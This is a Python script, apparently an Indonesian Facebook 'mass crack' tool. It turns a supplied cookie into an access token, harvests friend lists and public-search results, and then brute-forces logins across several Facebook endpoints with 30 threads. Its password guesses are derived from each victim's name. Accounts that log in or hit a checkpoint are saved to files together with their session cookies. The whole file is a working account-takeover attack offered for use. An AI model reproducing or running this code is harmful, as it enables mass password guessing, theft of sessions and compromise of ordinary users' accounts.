#-----------------[ IMPORT-MODULE ]-------------------
import requests,bs4,json,os,sys,random,datetime,time,re,subprocess,calendar
import urllib3,rich,base64
from bs4 import BeautifulSoup as parser
from bs4 import BeautifulSoup as par
from time import sleep
from rich.tree import Tree
from rich.columns import Columns
from rich import print as prints
from time import time as mek
from concurrent.futures import ThreadPoolExecutor as tred

# APPEND
ses=requests.Session()
id,id2,loop,ok,cp,tokenku,uid= [],[],0,0,0,[],[]
method = []
ualu =[]
ualuh = []
akun = []
printcp = []
redmi = []
uidl =[]
ugen = []
pwpluss,pwnya=[],[]

P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'

H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
P2 = "[#FFFFFF]" # PUTIH

dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
OK = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
CP = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'

# user agent anjay
ugen = []
for xd in range(500):
	rr = random.randint
	az = chr(random.randint(ord('A'), ord('Z')))
	ab = chr(random.randint(ord('A'), ord('Z')))
	a=random.choice(["4","5","6","7","8","9","10","11","12","13","9.1.5","5.1.6","4.0.1","3.0.1","4.0.2","5.0.2","6.0.1","6.2.2","7.0.1","7.1.0","8.1.0","4.4.4","5.6.1","6.1.3"])
	ua = f"Davik/2.1.0 (Linux; U; Android 12; ASUS_AI2201_A Build/SKQ1.220406.001; wv) [FBAN/FB4A;FBAV/187.0.0.43.81;FBPN/com.facebook.katana;FBLC/in_US;FBBV/122388438;FBCR/Smart;FBMF/asus;FBBD/asus;FBDV/ASUS_AI2201_A;FBSV/12;FBCA/arm64-v8a:null;FBDM/"+"{density=2.25,height=2048,width=2048};]"
	ua2 = f"Mozilla/5.0 (Windows Mobile 10; {str(rr(1,13))}; Android 10.0; Microsoft; Lumia 950XL){az}{str(rr(111,999))}{ab}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(40,114))}.0.{str(rr(4100,4500))}.{str(rr(30,180))} Mobile Safari/537.36 Edge/40.15254.603"
	ugen.append(ua2)
	
def banner():
	print("""
   ___     ___          _       ___  Kaneshiro   
  / __|___| _ )_ _ _  _| |_ ___| __|__ _ _ __ ___ 
  \__ \___| _ \ '_| || |  _/ -_) _/ _ \ '_/ _/ -_).  
  |___/   |___/_|  \_,_|\__\___|_|\___/_| \__\___| 
""")
	
def cek_menu():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login()
		except requests.exceptions.ConnectionError:
			print(f"{H}â€¢{P} internet tidak ada")
			exit()
	except IOError:
		login()
		
def hapus_login():
	os.system("rm .cok.txt")
	os.system("rm .token.txt")

def login():
	url = "https://mbasic.facebook.com"
	ses=requests.Session()
	cok = input(" [*] masukan cookie : ")
	try:
		data, data2 = {}, {}
		link = ses.post("https://graph.facebook.com/v16.0/device/login/", data={"access_token": "661587963994814|ffe07cc864fd1dc8fe386229dcb7a05e", "scope": ""}).json()
		kode = link["code"];user = link["user_code"]
		print(link)
		vers = parser(ses.get(f"{url}/device", cookies={"cookie": cok}).content, "html.parser")
		item = ["fb_dtsg","jazoest","qr"]
		for x in vers.find_all("input"):
			if x.get("name") in item:
				aset = {x.get("name"):x.get("value")}
				data.update(aset)
		data.update({"user_code":user})
		print(data)
		meta = parser(ses.post(url+vers.find("form", method="post").get("action"), data=data, cookies={"cookie": cok}).text, "html.parser")
		xzxz  = meta.find("form",{"method":"post"})
		for x in xzxz("input",{"value":True}):
			try:
				if x["name"] == "__CANCEL__" : pass
				else:data2.update({x['name']:x['value']})
			except Exception as e: pass
		print(data2)
		ses.post(f"{url}{xzxz['action']}", data=data2, cookies={"cookie":cok})
		tokz = ses.get(f"https://graph.facebook.com/v16.0/device/login_status?method=post&code={kode}&access_token=661587963994814|ffe07cc864fd1dc8fe386229dcb7a05e").json()
		ff = (tokz["access_token"])
		open('.cok.txt','w').write(cok)
		open('.token.txt','w').write(tokz["access_token"])
		print(ff)
		exit()
		print(" [*] jalankan ulang script")
	except Exception as e:exit(e)
	
def menu(my_name,my_id):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print(f" [*] cookie exp")
		time.sleep(5)
		login()
	os.system('clear')
	banner()
	print(f" [*] user : {my_name}\n [*] id : {my_id}\n\n [01]. crack massal\n [02]. cek hasil\n [03]. hapus cookie\n [00]. setting user agent\n")
	menu_input = input(" [*] input : ")
	if menu_input in ["01","1"]:
		publik_massal()
	elif menu_input in["02","2"]:
		cek_hasil()
	elif menu_input in ["03","3"]:
		hapus_login()
	elif menu_input in ["0","00"]:
		ua_merek()
	else:
		print(f" [*] tidak ada menu {menu_input}")
		time.sleep(1)
		menu(my_name,my_id)

def ua_merek():
	try:
		total = int(input(" [*] total merek user agent : "))
		print(" [*] contoh : SM-M136B Build/TP1A.220624.014; wv),ASUS_Z01QD)")
	except ValueError:exit()
	if total<1 or total>104:
			print("")
			exit()
	uas = 0
	for merk in range(total):
		uas+=1
		ualu = input(" [*] masukan merek user agent : ")
		open('ua.txt','a').write(f"{ualu}\n")
		##print(" [*] telah selesai menambah kan user agent... jalankan ulang tools dengan ketik : python run.py")
		

def cek_hasil():
	print(" [01]. hasil CP\n [02]. hasil OK\n")
	_____noah_____ = input(' [*] input : ')
	if _____noah_____ in ['1','01']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print(" [*] file tidak di temukan")
			time.sleep(2)
			exit()
		if len(vin)==0:
			print(" [*] file tidak ada")
			time.sleep(2)
			exit()
		else:
			print(' [*] hasil CP\n')
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(' ['+nom+']. '+isi+' ---> '+str(len(hem))+' Akun')
				else:
					lol.update({str(cih):str(isi)})
					print(' ['+str(cih)+']. '+isi+' ---> '+str(len(hem))+' Akun')
			geeh = input(' [*] pilih : ')
			try:geh = lol[geeh]
			except KeyError:
				print(" [*] pilihan tidak ada")
				exit()
			try:lin = open('CP/'+geh,'r').read()
			except:
				print(" [*] file tidak ada")
				time.sleep(2)
				exit()
			hus = os.system('cd CP && cat '+geh)
			input(" [*] kembali")
			exit()
	elif _____noah_____ in ['2','02']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print(" [*] file tidak di temukan")
			time.sleep(2)
			exit()
		if len(vin)==0:
			print (' [*] tidak ada hasil')
			time.sleep(2)
			exit()
		else:
			print(' [*] hasik OK\n')
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<100:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(' ['+nom+']. '+isi+' ---> '+str(len(hem))+' Akun')
				else:
					lol.update({str(cih):str(isi)})
					print(' ['+str(cih)+']. '+isi+' ---> '+str(len(hem))+' Akun')
			geeh = input(' [*] pilih : ')
			try:geh = lol[geeh]
			except KeyError:
				print(' [*] pilihan tidak ada')
				exit()
			try:lin = open('OK/'+geh,'r').read()
			except:
				print(' [*] tidak ada hasil')
				time.sleep(2)
				exit()
			hus = os.system('cd OK && cat '+geh)
			input(' [*] kembali')
			exit()
	elif _____noah_____ in ['0','00']:
		exit()
	else:
		print(' [*] pilihan tidak ada')
		exit()
	
def publik_massal():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		jum = int(input(f" [*] masukan total target : "))
	except ValueError:
		exit()
	if jum<1 or jum>100:
		print(f" [*] except")
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input(f' [*] masukan id : ')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:exit()
	try:
		#print('')
		print(f' [*] berhasil mengumpulkan '+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f" [*] ConnectionError ")
		exit()
	except (KeyError,IOError):
		print(f' [*] except')
		time.sleep(3)
		exit()

def crack_nama():
	nama = []
	custom = [" iqbal"," kami"," batam"," medan"," new"," old"," jian"," store"," tias"," rio"," lia"," farz"," marvel"," jakarta"," juven"," der"," rika"," udin"," rayan"," tina"," tiara"," fahmi"," baili"," rima"," gadis"," dimas"," abram"," ajis"," vicky"," charlie"," piko"," billa"]
	custom2 = [" iqbal"," kami"," batam"," medan"," new"," old"," jian"," store"," tias"," rio"," lia"," farz"," marvel"," jakarta"," juven"," der"," rika"," udin"," rayan"," tina"," tiara"," fahmi"," baili"," rima"," gadis"," dimas"," abram"," ajis"," vicky"," charlie"," piko"," billa"]
	nam = input(" [*] masukan nama : ").split(",")
	for ser in nam:		
		for belakang in custom:
			id = ser+belakang
			nama.append(id)
		for depan in custom2:
			id = depan+ser
			nama.append(id)
	with tred(max_workers=5) as thread:
		for id in nama:
			thread.submit(cari_nama,f"https://mbasic.facebook.com/public/{id}?/locale2=id_ID")
	setting()
		
def cari_nama(link):
	r = parser(ses.get(str(link)).text,'html.parser')
	for x in r.find_all('td'):
		data = re.findall('\<a\ href\=\"\/(.*?)\">\<div\ class\=\".*?\">\<div\ class\=\".*?\">(.*?)<\/div\>',str(x))
		for uid,nama in data:
			if 'profile.php?' in uid:
				uid = re.findall('id=(.*)',str(uid))[0]
			elif '<span' in nama:
				nama = re.findall('(.*?)\<',str(nama))[0]
			bo = uid+'|'+nama
			if bo in id:pass
			else:id.append(bo)
	link = r.find('a',string='Lihat Hasil Selanjutnya').get('href')
	if(link):
	  print(f' [*] berhasil mengumpulkan '+str(len(id)))
	  time.sleep(0.0000003)
	  cari_nama(link)
	else:
	     print("\r")

def setting():
	print('')
	print(f" [01]. tahun tua")
	print(f" [02]. tahun muda")
	print(f" [03]. tahun random\n")
	hu = input(f" [*] input : ")
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)
	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print(f" [*] input keluar")
		setting()
	print("")
	print(f" [01]. login dari validate.")
	print(f" [02]. login dari reguler.\n [03]. login dari validate 2.\n")
	gua=input(f" [*] input : ")
	if gua in ["1","01"]:
		method.append('validate')
	elif gua in ["2"]:
		method.append('async')
	elif gua in ['3']:
		method.append('validate_2')
	else:
		method.append('validate_m')
	#print('')
	#print(f" [*] minimal password 6 , contoh : sayang,naruto")
	pwplus=input(f" [*] tambah password tambahan (y/t) : ")
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		pwku=input(f" [*] masukan password tambahan : ")
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	uatambah = input(f' [*] apakah anda ingin menggunakan user agent manual (y/t) : ')
	if uatambah in ['y','Ya','ya','Y']:
		ualuh.append('ya')
		bzer = input(f' [*] masukan user agent anda : ')
		ualu.append(bzer)
	else:
		ualuh.append('tidak')
	passwrd()
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	print('')
	print(f' [*] hasil OK Tersimpan Di : OK/%s {P}'%(OK))
	print(f' [*] hasil CP Tersimpan Di : CP/%s {P}'%(CP))
	print("")
	with tred(max_workers=30) as pool:
		for anim in id2:
			idf,nmf = anim.split('|')[0],anim.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'validate' in method:
				pool.submit(validate,idf,pwv)
			elif 'async' in method:
				pool.submit(asyc,idf,pwv)
			elif 'validate_2' in method:
				pool.submit(validate_2,idf,pwv)
			else:
				pool.submit(metode_validate,idf,pwv,"m.facebook.com")
	print(" [*] crack telah selesai...")
	exit()

def validate(idf,pwv):
	global loop,ok,cp
	ses = requests.Session()
	#ua = random.choice(ugen)
	ua = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
	#ua = str(random.choice(open("ua.json","r").read().splitlines()))
	load = random.choice(["|","/"])
	print(f"\r [{H}{load}{P}] {loop}/{len(id)} OK-:{ok} CP-:{cp}",end=" ");sys.stdout.flush()
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			mek = random.randint(11,99)
			wibu = ses.get(f'https://m.facebook.com/login/device-based/password/?uid={idf}&flow=login_no_pin&hbl=0&refsrc=deprecated').text
			data = {
					"lsd": re.search('name="lsd" value="(.*?)"',str(wibu)).group(1),
					"jazoest": re.search('name="jazoest" value="(.*?)"', str(wibu)).group(1),
					"uid": idf,
					"next": f"https://m.facebook.com/login/save-device/",
					"flow": "login_no_pin",
					"pass": pw
						}
			wibu_head = {
					"host" : "m.facebook.com",
					"accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
					"accept-encoding" : "gzip, deflate, br",
					"accept-language" : "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
					"cache-control" : "max-age=0",
					"content-length" : "277",
					"content-type" : "application/x-www-form-urlencoded",
					"origin" : "m.facebook.com",
					"pragma" : "akamai-x-cache-on, akamai-x-cache-remote-on, akamai-x-check-cacheable, akamai-x-get-cache-key, akamai-x-get-extracted-values, akamai-x-get-ssl-client-session-id, akamai-x-get-true-cache-key, akamai-x-serial-no, akamai-x-get-request-id,akamai-x-get-nonces,akamai-x-get-client-ip,akamai-x-feo-trace",
					"referer" : f"https://m.facebook.com/login/device-based/password/?uid={idf}&flow=login_no_pin&hbl=0&refsrc=deprecated",
					"sec-ch-ua" : '"Not:A-Brand";v="99", "Chromium";v="112"',
					"sec-ch-ua-full-version-list" : '"Not:A-Brand";v="112.0.0.0", "Chromium";v="112.0.5615.137"',
					"sec-ch-ua-mobile" : "?1",
					"sec-ch-ua-platform" : '"Android"',
					"sec-ch-ua-platform-version" : '"10.0.0"',
					"sec-fetch-dest" : "document",
					"sec-fetch-mode" : "navigate",
					"sec-fetch-site" : "same-origin",
					"sec-fetch-user" : "?1",
					"upgrade-insecure-requests" : "1",
					"user-agent" : f"{ua}"}
			#####wibu_head = {"Host": "m.facebook.com","cache-control": "max-age=0","content-length" : "320","origin": "https://m.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "com.facebook.katana","sec-fetch-site": "same-origin","sec-fetch-dest" : "document","sec-fetch-mode" : "navigate","sec-fetch-user": "?1","upgrade-insecure-requests": "1","referer": f"https://m.facebook.com/login/device-based/password/?uid={idf}&flow=login_no_pin&hbl=0&refsrc=deprecated","accept-encoding": "gzip, deflate br","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			post = ses.post(f"https://m.facebook.com/login/device-based/validate-password/?shbl=0",data=data,headers=wibu_head,allow_redirects=False)
			if "checkpoint" in ses.cookies.get_dict().keys():
				print(f"\r{K} * --> {idf}|{pw}")
				open('VALID_CP/'+CP,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				kuki = tttt(ses.cookies.get_dict())
				coek = ses.cookies.get_dict()
				cuak=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
				print(f'\r{H} * --> {idf}|{pw}|{cuak}           {P}')
				open('VALID_OK/'+OK,'a').write(' * -----> '+idf+'|'+pw+'|'+kuki+'\n')
				break
			else:
				continue
		#except Exception as e:print(e)
		except requests.exceptions.ConnectionError:time.sleep(30)
	loop+=1
	
def asyc(idf,pwv):
	global loop,ok,cp
	ses = requests.Session()
	ua = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
	#ua = str(random.choice(open("ua.json","r").read().splitlines()))
	load = random.choice(["|","/"])
	print(f"\r [{H}{load}{P}] {loop}/{len(id)} OK-:{ok} CP-:{cp}",end=" ");sys.stdout.flush()
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			url = "mbasic.facebook.com"
			link = ses.get(f"https://mbasic.facebook.com/login.php?skip_api_login=1&return_multiple_errors=true&attempt_login=true&reg_instance=497e92d2-9dab-4116-82ae-82e0a0bb3f23&device_id=497e92d2-9dab-4116-82ae-82e0a0bb3f23&format=json&native_preconf=true&skip_session_info=true&locale=id_ID&client_country_code=ID&method=user.register&fb_api_req_friendly_name=registerAccount&fb_api_caller_class=com.facebook.registration.simplereg.fragment.RegistrationCreateAccountFragment&api_key=882a8490361da98702bf97a021ddc14d&sig=b519e57df762ca86da7ed97d5aa87d24")
			date = {
				"lsd":re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
				"jazoest":re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
				"email":idf,
				"pass":pw,
				"next":"https://"+url+"/login/save-device/?login_source=login"}
			head = {
				'accept': '*/*',
				'accept-encoding': 'gzip, deflate, br',
				'accept-language': 'id,en-US;q=0.9,en;q=0.8',
				'content-type': 'application/x-www-form-urlencoded',
				'Host': url,
				'origin': 'https://'+url,
				'referer': 'https://'+url+'/login/?source=auth_switcher',
				'user-agent': ua,
				'sec-ch-ua': '"Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"',
				'sec-ch-ua-mobile': '?0',
				'sec-fetch-dest': 'empty',
				'sec-fetch-mode': 'cors',
				'sec-fetch-site': 'same-origin',
				'x-requested-with': 'XMLHttpRequest'}
			bx = ses.post(f'https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100', headers=head, data=date)
			if "checkpoint" in ses.cookies.get_dict().keys():
				print(f"{K} * ---> {idf}|{pw}")
				open('CP/'+CP,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				kuki = tttt(ses.cookies.get_dict())
				coek = ses.cookies.get_dict()
				print(f" {H}* ---> {idf}|{pw}|{ua}")
				open('OK/'+OK,'a').write(' * -----> '+idf+'|'+pw+'|'+kuki+'\n')
				break
			else:
				continue
		#except Exception as e:print(e)
		except requests.exceptions.ConnectionError:time.sleep(30)
	loop+=1
	
def validate_2(idf,pwv):
	global loop,ok,cp
	ses = requests.Session()
	ua = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
	#ua = str(random.choice(open("ua.json","r").read().splitlines()))
	load = random.choice(["|","/"])
	print(f"\r [{H}{load}{P}] {loop}/{len(id)} OK-:{ok} CP-:{cp}",end=" ");sys.stdout.flush()
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			mek = random.randint(11,99)
			wibu = ses.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={idf}&flow=login_no_pin&hbl=0&refsrc=deprecated').text
			data = {
					"lsd": re.search('name="lsd" value="(.*?)"',str(wibu)).group(1),
					"jazoest": re.search('name="jazoest" value="(.*?)"', str(wibu)).group(1),
					"uid": idf,
					"next": f"https://mbasic.facebook.com/login/save-device/",
					"flow": "login_no_pin",
					"pass": pw
						}
			wibu_head = {
				'Host': 'mbasic.facebook.com',
				'cache-control': 'max-age=0',
				'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
				'sec-ch-ua-mobile': '?1',
				'sec-ch-ua-platform': '"Android"',
				'upgrade-insecure-requests': '1',
				'origin': 'https://mbasic.facebook.com',
				'content-type': 'application/x-www-form-urlencoded',
				'user-agent': ua,
				'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
				'sec-fetch-site': 'same-origin',
				'sec-fetch-mode': 'navigate',
				'sec-fetch-user': '?1',
				'sec-fetch-dest': 'document',
				'referer': f'https://mbasic.facebook.com/login/device-based/password/?uid={idf}&flow=login_no_pin&hbl=0&refsrc=deprecated',
				'accept-encoding': 'gzip, deflate, br',
				'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
			}
			#####wibu_head = {"Host": "m.facebook.com","cache-control": "max-age=0","content-length" : "320","origin": "https://m.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "com.facebook.katana","sec-fetch-site": "same-origin","sec-fetch-dest" : "document","sec-fetch-mode" : "navigate","sec-fetch-user": "?1","upgrade-insecure-requests": "1","referer": f"https://m.facebook.com/login/device-based/password/?uid={idf}&flow=login_no_pin&hbl=0&refsrc=deprecated","accept-encoding": "gzip, deflate br","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			post = ses.post(f"https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0",data=data,headers=wibu_head,allow_redirects=False)
			if "checkpoint" in ses.cookies.get_dict().keys():
				print(f"\r{P} * --> {K}{idf}|{pw} {P}")
				open('CP/'+CP,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				kuki = tttt(ses.cookies.get_dict())
				print(f"\r{P} * --> {H}{idf}|{pw}|{kuki}{P}")
				open('VALID_OK/'+OK,'a').write(' * -----> '+idf+'|'+pw+'|'+kuki+'\n')
				break
			else:
				continue
		#except Exception as e:print(e)
		except requests.exceptions.ConnectionError:time.sleep(30)
	loop+=1

def tttt(cooz):
	coki = "datr=" + cooz["datr"] + ";" + ("sb=" + cooz["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + cooz["c_user"]) + ";" + ("xs=" + cooz["xs"]) + ";" + ("fr=" + cooz["fr"]) + ";"
	return(str(coki))

if __name__=='__main__':
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	cek_menu()
	#crack_nama()
	#print(ugen)
